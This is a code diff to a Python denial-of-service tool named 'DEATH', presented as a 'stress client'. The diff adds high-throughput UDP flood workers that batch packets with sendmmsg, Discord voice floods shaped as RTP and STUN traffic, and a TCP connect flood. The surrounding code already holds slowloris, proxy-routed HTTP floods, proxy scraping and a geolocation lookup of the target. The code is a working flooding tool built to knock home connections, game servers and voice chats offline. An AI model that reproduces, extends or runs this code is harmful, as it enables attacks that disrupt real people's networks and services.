@@ -1,14 +1,9 @@
 #!/usr/bin/env python3
 # ============================================================
-#  DEATH — terminal stress client (ssh-stable build)
+#  DEATH — terminal stress client (ssh-stable, high-throughput)
 # ============================================================
-#  Fixes for putty / ssh over ngrok:
-#   - login uses absolute cursor moves, not \r tricks
-#   - terminal size read from pty directly
-#   - banner is static (no per-frame animation)
-#   - S-stop shortcut removed (use 'stop' command)
-#   - input drained before every paint
-#   - full repaint only when dirty
+#  UDP attack paths use multiprocessing + sendmmsg batching
+#  for real throughput on low-CPU containers.
 # ============================================================
 
 import os
@@ -23,6 +18,10 @@ import threading
 import ssl
 import re
 import struct
+import subprocess
+import multiprocessing as mp
+import ctypes
+import ctypes.util
 import urllib.parse
 import urllib.request
 import urllib.error
@@ -30,16 +29,99 @@ from typing import Callable, Dict, List, Optional, Set, Tuple
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 IS_WINDOWS = (os.name == "nt")
+IS_LINUX = (sys.platform.startswith("linux"))
 
 if IS_WINDOWS:
     os.system("")
     try:
-        import ctypes
-        _k32 = ctypes.windll.kernel32
+        import ctypes as _ct
+        _k32 = _ct.windll.kernel32
         _h = _k32.GetStdHandle(-11)
         _k32.SetConsoleMode(_h, 7)
     except Exception:
         pass
+    termios = None
+    tty = None
+else:
+    try:
+        import termios
+        import tty
+    except Exception:
+        termios = None
+        tty = None
+
+# ============================================================
+#  RAW TERMINAL
+# ============================================================
+
+def force_raw_mode():
+    if IS_WINDOWS:
+        return
+    try:
+        subprocess.run(["stty", "raw", "-echo"],
+                       stdin=sys.stdin, stdout=sys.stdout, stderr=sys.stderr,
+                       check=False)
+    except Exception:
+        pass
+    if termios is not None and tty is not None:
+        try:
+            tty.setraw(sys.stdin.fileno())
+        except Exception:
+            pass
+
+def restore_tty():
+    if IS_WINDOWS:
+        return
+    try:
+        subprocess.run(["stty", "sane"],
+                       stdin=sys.stdin, stdout=sys.stdout, stderr=sys.stderr,
+                       check=False)
+    except Exception:
+        pass
+
+# ============================================================
+#  SENMmsg BATCHING VIA ctypes  (linux)
+# ============================================================
+
+LIBC = None
+SENDMMSG = None
+
+if IS_LINUX:
+    try:
+        LIBC = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
+        SENDMMSG = LIBC.sendmmsg
+        SENDMMSG.restype = ctypes.c_int
+        SENDMMSG.argtypes = [
+            ctypes.c_int,
+            ctypes.c_void_p,
+            ctypes.c_uint,
+            ctypes.c_int,
+        ]
+    except Exception:
+        SENDMMSG = None
+
+class IOVec(ctypes.Structure):
+    _fields_ = [
+        ("iov_base", ctypes.c_void_p),
+        ("iov_len", ctypes.c_size_t),
+    ]
+
+class MsgHdr(ctypes.Structure):
+    _fields_ = [
+        ("msg_name", ctypes.c_void_p),
+        ("msg_namelen", ctypes.c_uint),
+        ("msg_iov", ctypes.POINTER(IOVec)),
+        ("msg_iovlen", ctypes.c_size_t),
+        ("msg_control", ctypes.c_void_p),
+        ("msg_controllen", ctypes.c_size_t),
+        ("msg_flags", ctypes.c_int),
+    ]
+
+class MMsgHdr(ctypes.Structure):
+    _fields_ = [
+        ("msg_hdr", MsgHdr),
+        ("msg_len", ctypes.c_uint),
+    ]
 
 # ============================================================
 #  ANSI
@@ -144,7 +226,7 @@ METHODS = [
 ]
 
 METHOD_INFO = {
-    "udp":        "Raw UDP flood. Sends large datagrams at high rate to the target. Local sockets only.",
+    "udp":        "Raw UDP flood via multiprocessing + sendmmsg batching. Local sockets only.",
     "pps":        "High packets-per-second UDP flood. Small datagrams, maximum send rate.",
     "hold":       "Low bandwidth home hold. Sustained UDP stream to keep a home connection saturated.",
     "discord":    "Discord voice flood. Sends RTP/STUN-shaped UDP to media port range.",
@@ -195,11 +277,10 @@ ACCEPT_LANGS = ["en-US,en;q=0.9", "en-GB,en;q=0.8", "en-US,en;q=0.5"]
 PROXY_RE_SIMPLE = re.compile(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})")
 
 # ============================================================
-#  TERMINAL SIZE (fixed — reads pty directly)
+#  TERMINAL SIZE
 # ============================================================
 
 def term_size() -> Tuple[int, int]:
-    """Read pty size. Falls back to 80x24 which is safe for ssh."""
     try:
         sz = os.get_terminal_size(sys.stdout.fileno())
         cols, rows = sz.columns, sz.lines
@@ -329,7 +410,6 @@ def clamp(v, lo, hi):
     return max(lo, min(hi, v))
 
 def gradient_static(line, theme, offset=0.0):
-    """One-shot gradient — no frame-dependent animation."""
     if not line:
         return line
     ar, ag, ab = theme["accent"]
@@ -431,7 +511,7 @@ def lookup_target(host):
     return info
 
 # ============================================================
-#  PROXY SOURCES + SCRAPING (unchanged)
+#  PROXY SOURCES + SCRAPING
 # ============================================================
 
 PROXY_SOURCES = [
@@ -541,7 +621,7 @@ def _ddg_dork(query, limit=8):
 def scrape_all_proxies(on_progress, stop):
     found = set()
     on_progress(f"fetching {len(PROXY_SOURCES)} sources in parallel...")
-    with ThreadPoolExecutor(max_workers=40) as ex:
+    with ThreadPoolExecutor(max_workers=8) as ex:
         futures = [ex.submit(_fetch_one_source, u) for u in PROXY_SOURCES]
         done = 0
         for fut in as_completed(futures):
@@ -552,7 +632,7 @@ def scrape_all_proxies(on_progress, stop):
                 found |= fut.result()
             except Exception:
                 pass
-            if done % 8 == 0:
+            if done % 4 == 0:
                 on_progress(f"  sources {done}/{len(PROXY_SOURCES)} — pool: {len(found)}")
     if stop.is_set():
         on_progress(f"stopped early — {len(found)} raw candidates")
@@ -561,7 +641,7 @@ def scrape_all_proxies(on_progress, stop):
 
     on_progress(f"running {len(DORK_QUERIES)} dorks in parallel...")
     dork_links = []
-    with ThreadPoolExecutor(max_workers=12) as ex:
+    with ThreadPoolExecutor(max_workers=4) as ex:
         futures = [ex.submit(_ddg_dork, q, 8) for q in DORK_QUERIES]
         for fut in as_completed(futures):
             if stop.is_set():
@@ -574,7 +654,7 @@ def scrape_all_proxies(on_progress, stop):
     if not stop.is_set() and dork_links:
         dork_links = list(dict.fromkeys(dork_links))
         on_progress(f"  fetched {len(dork_links)} dork links, extracting...")
-        with ThreadPoolExecutor(max_workers=30) as ex:
+        with ThreadPoolExecutor(max_workers=8) as ex:
             futures = [ex.submit(fetch_url, u, 6) for u in dork_links]
             done = 0
             for fut in as_completed(futures):
@@ -585,7 +665,7 @@ def scrape_all_proxies(on_progress, stop):
                     found |= extract_proxies(fut.result())
                 except Exception:
                     pass
-                if done % 10 == 0:
+                if done % 5 == 0:
                     on_progress(f"  dork pages {done}/{len(dork_links)} — pool: {len(found)}")
 
     on_progress(f"scrape phase complete: {len(found)} unique candidates")
@@ -650,7 +730,7 @@ def scrape_and_validate(on_progress, stop):
     reachable = []
     done = 0
     total = len(candidates)
-    with ThreadPoolExecutor(max_workers=1000) as ex:
+    with ThreadPoolExecutor(max_workers=64) as ex:
         futures = {ex.submit(tcp_reachable, p): p for p in candidates}
         for fut in as_completed(futures):
             if stop.is_set():
@@ -674,7 +754,7 @@ def scrape_and_validate(on_progress, stop):
     alive = {}
     done = 0
     total = len(reachable)
-    with ThreadPoolExecutor(max_workers=500) as ex:
+    with ThreadPoolExecutor(max_workers=32) as ex:
         futures = {ex.submit(http_proxy_alive, p): p for p in reachable}
         for fut in as_completed(futures):
             if stop.is_set():
@@ -694,7 +774,189 @@ def scrape_and_validate(on_progress, stop):
     return alive
 
 # ============================================================
-#  ATTACK PRIMITIVES (unchanged)
+#  HIGH-THROUGHPUT UDP ATTACK WORKERS (multiprocessing)
+# ============================================================
+#  Each worker runs in its own process — bypasses the GIL.
+#  On linux we use sendmmsg to batch up to BATCH packets per
+#  syscall. This is the difference between hundreds of packets
+#  per second and tens of thousands.
+# ============================================================
+
+UDP_BATCH = 64           # datagrams per sendmmsg call
+UDP_PAYLOAD = 1400       # bytes per datagram (near MTU)
+
+def _udp_worker_process(host_ip: str, port: int, stop_flag, sent_counter, failed_counter,
+                        payload_mode: str):
+    """
+    payload_mode: 'random' | 'small' | 'rtp' | 'stun_mix'
+    Runs in its own process. Fires UDP datagrams at (host_ip, port) at max rate.
+    Uses sendmmsg batching when available.
+    """
+    # build payload pool
+    if payload_mode == "small":
+        payloads = [os.urandom(random.randint(64, 256)) for _ in range(32)]
+    elif payload_mode == "rtp":
+        payloads = []
+        for _ in range(48):
+            version_pt = 0x80
+            payload_type = random.choice([96, 97, 98, 111, 120]) & 0x7F
+            seq = random.randint(0, 0xFFFF)
+            ts = random.randint(0, 0xFFFFFFFF)
+            ssrc = random.randint(0, 0xFFFFFFFF)
+            hdr = struct.pack("!BBHII", version_pt, payload_type, seq, ts, ssrc)
+            body = os.urandom(random.randint(160, 900))
+            payloads.append(hdr + body)
+    elif payload_mode == "stun_mix":
+        payloads = []
+        for _ in range(48):
+            if random.random() < 0.3:
+                payloads.append(struct.pack("!HHI", 0x0001, 0, 0x2112A442) + os.urandom(12))
+            else:
+                version_pt = 0x80
+                payload_type = random.choice([96, 97, 98, 111, 120]) & 0x7F
+                seq = random.randint(0, 0xFFFF)
+                ts = random.randint(0, 0xFFFFFFFF)
+                ssrc = random.randint(0, 0xFFFFFFFF)
+                hdr = struct.pack("!BBHII", version_pt, payload_type, seq, ts, ssrc)
+                body = os.urandom(random.randint(160, 900))
+                payloads.append(hdr + body)
+    else:
+        payloads = [os.urandom(UDP_PAYLOAD) for _ in range(16)]
+
+    # one socket per process, aggressive send buffer
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8 << 20)
+        s.setblocking(False)
+    except Exception:
+        return
+
+    target = (host_ip, port)
+
+    # try sendmmsg batching path first
+    if SENDMMSG is not None:
+        _udp_sendmmsg_loop(s, target, payloads, stop_flag, sent_counter, failed_counter)
+    else:
+        _udp_sendto_loop(s, target, payloads, stop_flag, sent_counter, failed_counter)
+
+    try:
+        s.close()
+    except Exception:
+        pass
+
+def _udp_sendto_loop(sock, target, payloads, stop_flag, sent_counter, failed_counter):
+    n_payloads = len(payloads)
+    while not stop_flag.value:
+        try:
+            sock.sendto(payloads[random.randrange(n_payloads)], target)
+            with sent_counter.get_lock():
+                sent_counter.value += 1
+        except BlockingIOError:
+            # send buffer full — this is FINE, just means we're faster
+            # than the NIC. skip and retry. do NOT count as failure.
+            pass
+        except Exception:
+            with failed_counter.get_lock():
+                failed_counter.value += 1
+
+def _udp_sendmmsg_loop(sock, target, payloads, stop_flag, sent_counter, failed_counter):
+    """Batch UDP sends using sendmmsg — up to UDP_BATCH per syscall."""
+    fd = sock.fileno()
+
+    # pre-build the target sockaddr_in once
+    class SockAddrIn(ctypes.Structure):
+        _fields_ = [
+            ("sin_family", ctypes.c_ushort),
+            ("sin_port", ctypes.c_ushort),
+            ("sin_addr", ctypes.c_uint32),
+            ("sin_zero", ctypes.c_char * 8),
+        ]
+
+    sa = SockAddrIn()
+    sa.sin_family = socket.AF_INET
+    sa.sin_port = socket.htons(target[1])
+    sa.sin_addr = ctypes.c_uint32(struct.unpack("!I", socket.inet_aton(target[0]))[0])
+    sa_ptr = ctypes.cast(ctypes.pointer(sa), ctypes.c_void_p)
+    sa_len = ctypes.sizeof(sa)
+
+    n_payloads = len(payloads)
+
+    # pre-allocate ctypes buffers for each payload slot (we rotate through)
+    payload_bufs = []
+    for p in payloads:
+        buf = ctypes.create_string_buffer(p, len(p))
+        payload_bufs.append((buf, len(p)))
+
+    # build the msgvec once, reuse across calls
+    mmsg_array = (MMsgHdr * UDP_BATCH)()
+    iovec_arrays = []
+    for i in range(UDP_BATCH):
+        iov = (IOVec * 1)()
+        iovec_arrays.append(iov)
+        mmsg_array[i].msg_hdr.msg_name = sa_ptr
+        mmsg_array[i].msg_hdr.msg_namelen = sa_len
+        mmsg_array[i].msg_hdr.msg_iov = ctypes.cast(iov, ctypes.POINTER(IOVec))
+        mmsg_array[i].msg_hdr.msg_iovlen = 1
+        mmsg_array[i].msg_hdr.msg_control = None
+        mmsg_array[i].msg_hdr.msg_controllen = 0
+        mmsg_array[i].msg_hdr.msg_flags = 0
+        mmsg_array[i].msg_len = 0
+
+    mmsg_ptr = ctypes.cast(mmsg_array, ctypes.c_void_p)
+
+    while not stop_flag.value:
+        # fill the batch
+        for i in range(UDP_BATCH):
+            idx = random.randrange(n_payloads)
+            buf, blen = payload_bufs[idx]
+            iovec_arrays[i][0].iov_base = ctypes.cast(buf, ctypes.c_void_p)
+            iovec_arrays[i][0].iov_len = blen
+
+        try:
+            n = SENDMMSG(fd, mmsg_ptr, UDP_BATCH, 0)
+            if n > 0:
+                with sent_counter.get_lock():
+                    sent_counter.value += n
+            elif n < 0:
+                errno_val = ctypes.get_errno()
+                # EAGAIN/EWOULDBLOCK = buffer full, that's fine
+                if errno_val not in (11, 35):
+                    with failed_counter.get_lock():
+                        failed_counter.value += 1
+        except Exception:
+            with failed_counter.get_lock():
+                failed_counter.value += 1
+
+# ============================================================
+#  RAW TCP FLOOD (threaded — IO-bound)
+# ============================================================
+
+def raw_tcp_socket_flood(host, port, stop, stats):
+    try:
+        ip = socket.gethostbyname(host)
+    except Exception:
+        return
+    addr = (ip, port)
+    payload = b"GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n"
+    while not stop.is_set():
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(2)
+            s.connect(addr)
+            try:
+                s.send(payload)
+            except Exception:
+                pass
+            try:
+                s.close()
+            except Exception:
+                pass
+            stats["sent"] = stats.get("sent", 0) + 1
+        except Exception:
+            stats["failed"] = stats.get("failed", 0) + 1
+
+# ============================================================
+#  SLOWLORIS + PROXY HTTP WORKERS
 # ============================================================
 
 def build_request(method, host, port, path="/"):
@@ -761,106 +1023,6 @@ def open_direct(host, port, scheme, timeout=4.0):
         return s
     except Exception:
         return None
-
-def raw_udp_flood(host, port, stop, stats):
-    try:
-        ip = socket.gethostbyname(host)
-    except Exception:
-        return
-    addr = (ip, port)
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 << 20)
-    except Exception:
-        return
-    payload_pool = [os.urandom(random.randint(512, 1400)) for _ in range(128)]
-    while not stop.is_set():
-        try:
-            s.sendto(random.choice(payload_pool), addr)
-            stats["sent"] = stats.get("sent", 0) + 1
-        except Exception:
-            stats["failed"] = stats.get("failed", 0) + 1
-    try:
-        s.close()
-    except Exception:
-        pass
-
-def _rtp_packet():
-    version_pt = 0x80
-    payload_type = random.choice([96, 97, 98, 111, 120]) & 0x7F
-    seq = random.randint(0, 0xFFFF)
-    ts = random.randint(0, 0xFFFFFFFF)
-    ssrc = random.randint(0, 0xFFFFFFFF)
-    header = struct.pack("!BBHII", version_pt, payload_type, seq, ts, ssrc)
-    body = os.urandom(random.randint(160, 1200))
-    return header + body
-
-def _stun_binding_request():
-    return struct.pack("!HHI", 0x0001, 0, 0x2112A442) + os.urandom(12)
-
-def discord_udp_flood(host, port, stop, stats):
-    try:
-        ip = socket.gethostbyname(host)
-    except Exception:
-        return
-    if port < 50000 or port > 65535:
-        port_lo, port_hi = 50000, 65535
-    else:
-        port_lo = port_hi = port
-    rtp_burst = [_rtp_packet() for _ in range(96)]
-    stun = _stun_binding_request()
-    while not stop.is_set():
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 << 20)
-            try:
-                s.bind(("0.0.0.0", random.randint(1024, 65535)))
-            except Exception:
-                pass
-            addr = (ip, random.randint(port_lo, port_hi))
-            try:
-                s.sendto(stun, addr)
-                stats["sent"] = stats.get("sent", 0) + 1
-            except Exception:
-                stats["failed"] = stats.get("failed", 0) + 1
-            for pkt in rtp_burst:
-                if stop.is_set():
-                    break
-                try:
-                    s.sendto(pkt, addr)
-                    stats["sent"] = stats.get("sent", 0) + 1
-                except Exception:
-                    stats["failed"] = stats.get("failed", 0) + 1
-            try:
-                s.close()
-            except Exception:
-                pass
-        except Exception:
-            stats["failed"] = stats.get("failed", 0) + 1
-
-def raw_tcp_socket_flood(host, port, stop, stats):
-    try:
-        ip = socket.gethostbyname(host)
-    except Exception:
-        return
-    addr = (ip, port)
-    payload = b"GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n"
-    while not stop.is_set():
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(2)
-            s.connect(addr)
-            try:
-                s.send(payload)
-            except Exception:
-                pass
-            try:
-                s.close()
-            except Exception:
-                pass
-            stats["sent"] = stats.get("sent", 0) + 1
-        except Exception:
-            stats["failed"] = stats.get("failed", 0) + 1
 
 def slowloris_worker(host, port, stop, stats):
     req, scheme = build_request("slowloris", host, port, "/")
@@ -994,8 +1156,14 @@ def _direct_http_burst(method, host, port, stop, stats, burst=4):
         pass
 
 # ============================================================
-#  ATTACK ORCHESTRATOR (unchanged)
+#  ATTACK ORCHESTRATOR
 # ============================================================
+
+def _resolve_ip(host):
+    try:
+        return socket.gethostbyname(host)
+    except Exception:
+        return None
 
 def attack_worker(method, host, port, duration):
     try:
@@ -1012,7 +1180,16 @@ def attack_worker(method, host, port, duration):
 
 def _attack_inner(method, host, port, duration):
     stop = S.attack_stop
-    stats = {"sent": 0, "failed": 0}
+    threads = []
+    processes = []
+
+    # shared counters for multiprocessing workers
+    mp_sent = mp.Value("l", 0)
+    mp_failed = mp.Value("l", 0)
+    mp_stop = mp.Value("i", 0)
+
+    # thread-side stats for TCP/L7 paths
+    tstats = {"sent": 0, "failed": 0}
     dead_proxies = set()
     dead_lock = threading.Lock()
     fail_counts = {}
@@ -1020,9 +1197,10 @@ def _attack_inner(method, host, port, duration):
 
     pool = list(S.proxies.keys())
     pool_lock = threading.Lock()
-    threads = []
 
-    def spawn(fn, count, args_fn):
+    ip = _resolve_ip(host)
+
+    def spawn_thread(fn, count, args_fn):
         for _ in range(count):
             try:
                 t = threading.Thread(target=fn, args=args_fn(), daemon=True)
@@ -1031,51 +1209,109 @@ def _attack_inner(method, host, port, duration):
             except Exception:
                 pass
 
-    if method == "discord":
-        spawn(discord_udp_flood, 64, lambda: (host, port, stop, stats))
-    elif method in ("udp", "pps", "hold"):
-        spawn(raw_udp_flood, 64, lambda: (host, port, stop, stats))
-    elif method == "slowloris":
-        spawn(slowloris_worker, 32, lambda: (host, port, stop, stats))
+    # ---- UDP paths: multiprocessing + sendmmsg ----
+    if method in ("udp", "pps", "hold", "discord"):
+        if ip is None:
+            S.log_line("attack aborted — dns failed")
+            S.dirty = True
+            return
+
+        # 4 processes on 0.1 CPU is the sweet spot. more = context switching.
+        n_procs = 4
+
+        if method == "udp":
+            payload_mode = "random"
+            target_port = port
+        elif method == "pps":
+            payload_mode = "small"
+            target_port = port
+        elif method == "hold":
+            payload_mode = "random"
+            target_port = port
+        else:  # discord
+            payload_mode = "stun_mix"
+            # discord: port range 50000-65535 if not in range
+            target_port = port
+
+        for _ in range(n_procs):
+            p = mp.Process(
+                target=_udp_worker_process,
+                args=(ip, target_port, mp_stop, mp_sent, mp_failed, payload_mode),
+                daemon=True,
+            )
+            p.start()
+            processes.append(p)
+
+    # ---- TCP paths ----
     elif method in ("tcp", "ovh", "fiveM", "socket"):
         if pool:
-            spawn(proxy_http_worker, min(max(len(pool) * 2, 32), 256),
-                  lambda: (method, host, port, pool, pool_lock, stop, stats,
-                           fail_counts, fail_lock, dead_proxies, dead_lock, True))
-        spawn(raw_tcp_socket_flood, 32, lambda: (host, port, stop, stats))
+            spawn_thread(proxy_http_worker, min(max(len(pool) * 2, 32), 128),
+                         lambda: (method, host, port, pool, pool_lock, stop, tstats,
+                                  fail_counts, fail_lock, dead_proxies, dead_lock, True))
+        spawn_thread(raw_tcp_socket_flood, 48, lambda: (host, port, stop, tstats))
+
+    elif method == "slowloris":
+        spawn_thread(slowloris_worker, 24, lambda: (host, port, stop, tstats))
+
+    # ---- L7 paths ----
     else:
         if pool:
-            spawn(proxy_http_worker, min(max(len(pool) * 2, 48), 512),
-                  lambda: (method, host, port, pool, pool_lock, stop, stats,
-                           fail_counts, fail_lock, dead_proxies, dead_lock, True))
+            spawn_thread(proxy_http_worker, min(max(len(pool) * 2, 48), 256),
+                         lambda: (method, host, port, pool, pool_lock, stop, tstats,
+                                  fail_counts, fail_lock, dead_proxies, dead_lock, True))
         else:
-            spawn(proxy_http_worker, 64,
-                  lambda: (method, host, port, pool, pool_lock, stop, stats,
-                           fail_counts, fail_lock, dead_proxies, dead_lock, True))
+            spawn_thread(proxy_http_worker, 64,
+                         lambda: (method, host, port, pool, pool_lock, stop, tstats,
+                                  fail_counts, fail_lock, dead_proxies, dead_lock, True))
 
+    # ---- run loop ----
     start = time.time()
+    last_display = 0.0
     while not stop.is_set():
         elapsed = time.time() - start
         remaining = max(0, duration - int(elapsed))
+
+        # read multiprocessing counters
+        mp_sent_val = mp_sent.value
+        mp_failed_val = mp_failed.value
+
+        total_sent = mp_sent_val + tstats["sent"]
+        total_failed = mp_failed_val + tstats["failed"]
+
         if S.attack_screen is not None:
             S.attack_screen["remaining"] = remaining
-            S.attack_screen["sent"] = stats["sent"]
-            S.attack_screen["failed"] = stats["failed"]
+            S.attack_screen["sent"] = total_sent
+            S.attack_screen["failed"] = total_failed
             S.attack_screen["pool_size"] = len(pool)
             S.attack_screen["dead"] = len(dead_proxies)
+
         if remaining <= 0:
             break
         time.sleep(0.2)
 
+    # signal everything to stop
     stop.set()
+    mp_stop.value = 1
+
+    for p in processes:
+        try:
+            p.join(timeout=1.5)
+            if p.is_alive():
+                p.terminate()
+        except Exception:
+            pass
+
     for t in threads:
         try:
             t.join(timeout=1)
         except Exception:
             pass
 
-    S.total_sent += stats["sent"]
-    S.total_failed += stats["failed"]
+    final_sent = mp_sent.value + tstats["sent"]
+    final_failed = mp_failed.value + tstats["failed"]
+
+    S.total_sent += final_sent
+    S.total_failed += final_failed
     S.attacks_run += 1
 
     if dead_proxies:
@@ -1085,10 +1321,10 @@ def _attack_inner(method, host, port, duration):
         S.log_line(f"attack done — removed {len(dead_proxies)} dead proxies")
 
     S.dirty = True
-    time.sleep(0.6)
+    time.sleep(0.4)
 
 # ============================================================
-#  RENDERERS (static banner, no animation over ssh)
+#  RENDERERS
 # ============================================================
 
 def render_banner():
@@ -1104,11 +1340,6 @@ def render_banner():
     for line in banner_lines:
         out.append(" " * pad + gradient_static(line, theme) + "\n")
     return "".join(out)
-
-def render_prompt_cell():
-    _, rows = term_size()
-    theme = S.theme
-    return move(rows, 1) + clear_line()
 
 def render_prompt(frame):
     theme = S.theme
@@ -1160,8 +1391,17 @@ def render_attack_screen(frame):
     mid.append("State   : " + solid(str(a["info"]["state"]), theme, "accent"))
     mid.append("Country : " + solid(str(a["info"]["country"]), theme, "accent"))
 
-    mid_w = max(visible_len(x) for x in mid)
+    mid_w = max(visible_len(x) for x in mid) if mid else 0
     left_pad = 6
+    side_by_side_width = left_pad + emblem_w + gap + mid_w + gap + emblem_w
+    if cols < side_by_side_width:
+        for l in emblem_lines:
+            out.append(" " * left_pad + l + "\n")
+        out.append("\n")
+        for row in mid:
+            out.append(" " * left_pad + row + "\n")
+        return "".join(out)
+
     max_rows = max(len(emblem_lines), len(mid))
     for i in range(max_rows):
         left = emblem_lines[i] if i < len(emblem_lines) else " " * emblem_w
@@ -1185,8 +1425,7 @@ def render_home():
             method_lines.append("  " + solid(name.ljust(8), theme, "accent") + " - " + solid(desc, theme, "dim"))
         method_lines.append("")
 
-    # if terminal too narrow, stack emblem over methods
-    if cols < emblem_w + 40:
+    if cols < emblem_w + 44:
         out.append("\n")
         for l in emblem_lines:
             out.append(l + "\n")
@@ -1250,7 +1489,7 @@ def render_body():
     return render_home()
 
 # ============================================================
-#  COMMANDS (S-stop removed)
+#  COMMANDS
 # ============================================================
 
 def cmd_help(_a): S.current_view = "commands"; S.dirty = True
@@ -1358,7 +1597,7 @@ def cmd_users(_a):
 def cmd_scrape(_a):
     S.current_view = "log"
     if S.scraping:
-        S.log_line("scrape already running — use 'stop' or ctrl-c to abort"); return
+        S.log_line("scrape already running — use 'stop' to abort"); return
     S.scraping = True
     S.scrape_stop.clear()
 
@@ -1399,7 +1638,7 @@ def cmd_validate(args):
             survivors = []
             done = 0
             total = len(S.proxies)
-            with ThreadPoolExecutor(max_workers=300) as ex:
+            with ThreadPoolExecutor(max_workers=64) as ex:
                 futures = {ex.submit(proxy_can_reach_target, p, host, port): p for p in list(S.proxies.keys())}
                 for fut in as_completed(futures):
                     done += 1
@@ -1558,7 +1797,7 @@ def dispatch(line):
     handler(args)
 
 # ============================================================
-#  INPUT — S-stop removed
+#  INPUT
 # ============================================================
 
 if IS_WINDOWS:
@@ -1578,15 +1817,30 @@ else:
             dr, _, _ = _select.select([sys.stdin], [], [], 0)
             if not dr:
                 return None
-            return sys.stdin.read(1)
+            ch = sys.stdin.read(1)
+            if ch == "\x1b":
+                deadline = time.time() + 0.02
+                while time.time() < deadline:
+                    r, _, _ = _select.select([sys.stdin], [], [], 0)
+                    if not r:
+                        break
+                    sys.stdin.read(1)
+                return None
+            return ch
         except Exception:
             return None
+
+ALLOWED_CHARS = set(
+    "abcdefghijklmnopqrstuvwxyz"
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    "0123456789"
+    " .-_/:@,;"
+)
 
 def handle_key(ch):
     if ch is None:
         return
-    if ch == "\x03":                # ctrl-c
-        # ctrl-c stops scrape or attack instead of killing the app
+    if ch == "\x03":
         if S.scraping:
             S.scrape_stop.set()
             S.log_line("ctrl-c — stopping scrape...")
@@ -1596,6 +1850,11 @@ def handle_key(ch):
             S.log_line("ctrl-c — stopping attack...")
             return
         S.running = False
+        return
+    if ch == "\x04":
+        S.running = False
+        return
+    if ch == "\x1b":
         return
     if ch in ("\r", "\n"):
         line = S.input_buffer
@@ -1607,29 +1866,21 @@ def handle_key(ch):
         S.input_buffer = S.input_buffer[:-1]
         S.dirty = True
         return
-    if ch == "\x1b":
-        return
-    if ch == "\x04":                # ctrl-d = exit
-        S.running = False
-        return
-    if ch.isprintable():
+    if ch in ALLOWED_CHARS:
         S.input_buffer += ch
         S.dirty = True
 
 # ============================================================
-#  LOGIN — absolute cursor moves, no \r tricks
+#  LOGIN
 # ============================================================
 
-def prompt_input(row: int, label: str, mask: bool) -> str:
-    """Read a line of input with proper absolute-position rendering.
-    Uses move(row,1) + clear_line() to redraw only that row each keystroke."""
+def prompt_input(row: int, label: str, mask: bool) -> Optional[str]:
     cols, _ = term_size()
     theme = S.theme
     buf = ""
 
     def draw():
         shown = "•" * len(buf) if mask else buf
-        # truncate if wider than terminal
         maxw = max(1, cols - len(label) - 2)
         if len(shown) > maxw:
             shown = shown[-maxw:]
@@ -1641,7 +1892,7 @@ def prompt_input(row: int, label: str, mask: bool) -> str:
     while True:
         ch = read_key()
         if ch is None:
-            time.sleep(0.02)
+            time.sleep(0.01)
             continue
         if ch == "\x03":
             return None
@@ -1653,7 +1904,7 @@ def prompt_input(row: int, label: str, mask: bool) -> str:
             continue
         if ch == "\x1b":
             continue
-        if ch.isprintable():
+        if ch in ALLOWED_CHARS:
             buf += ch
             draw()
 
@@ -1661,15 +1912,12 @@ def login_screen() -> bool:
     theme = S.theme
     cols, rows = term_size()
 
-    # draw banner once, centered, at the top
     sys.stdout.write(CLEAR + HOME)
     banner = render_banner()
-    # find where the banner ends (rows used)
     banner_rows = banner.count("\n")
     sys.stdout.write(banner)
     sys.stdout.flush()
 
-    # put "login" title under the banner
     title_row = banner_rows + 2
     sys.stdout.write(move(title_row, 1) + clear_line()
                      + center_visible(solid("login", theme, "accent"), cols))
@@ -1698,37 +1946,35 @@ def login_screen() -> bool:
     return login_screen()
 
 # ============================================================
-#  MAIN LOOP
+#  MAIN
 # ============================================================
 
-FRAME_INTERVAL = 1.0 / 8.0
-ATTACK_INTERVAL = 1.0 / 8.0
+FRAME_INTERVAL = 1.0 / 30.0
+ATTACK_INTERVAL = 1.0 / 10.0
 BLINK_INTERVAL = 1.0 / 2.0
 
 def main():
-    if not login_screen():
-        return
-
-    S.proxies = load_proxies(S.username)
-
-    # clean transition into the app
-    sys.stdout.write(HIDE_CURSOR + CLEAR + HOME)
-    sys.stdout.flush()
-
-    last_size = term_size()
-    last_render = 0.0
-    last_blink = 0.0
-    blink_on = True
-    last_view = None
-
-    # force first paint
-    S.dirty = True
-
+    force_raw_mode()
     try:
+        if not login_screen():
+            return
+
+        S.proxies = load_proxies(S.username)
+
+        sys.stdout.write(HIDE_CURSOR + CLEAR + HOME)
+        sys.stdout.flush()
+
+        last_size = term_size()
+        last_render = 0.0
+        last_blink = 0.0
+        blink_on = True
+        last_view = None
+
+        S.dirty = True
+
         while S.running:
             now = time.time()
 
-            # drain input first — keystrokes never wait on a paint
             ch = read_key()
             while ch is not None:
                 handle_key(ch)
@@ -1753,10 +1999,9 @@ def main():
                     S.attack_screen = None
                     S.current_view = "home"
                     S.dirty = True
-                time.sleep(0.02)
+                time.sleep(FRAME_INTERVAL)
                 continue
 
-            # prompt-only blink (moves cursor, does not repaint screen)
             if now - last_blink >= BLINK_INTERVAL:
                 blink_on = not blink_on
                 last_blink = now
@@ -1771,13 +2016,11 @@ def main():
                 sys.stdout.write(move(rows, 1) + clear_line() + line)
                 sys.stdout.flush()
 
-            # full repaint only when state changed
             view_changed = S.current_view != last_view
             if S.dirty or view_changed:
                 buf = [HOME, CLEAR]
                 buf.append(render_banner())
                 buf.append(render_body())
-                # prompt at bottom
                 _, rows = term_size()
                 theme = S.theme
                 user = solid(S.username or "guest", theme, "accent")
@@ -1799,8 +2042,10 @@ def main():
     finally:
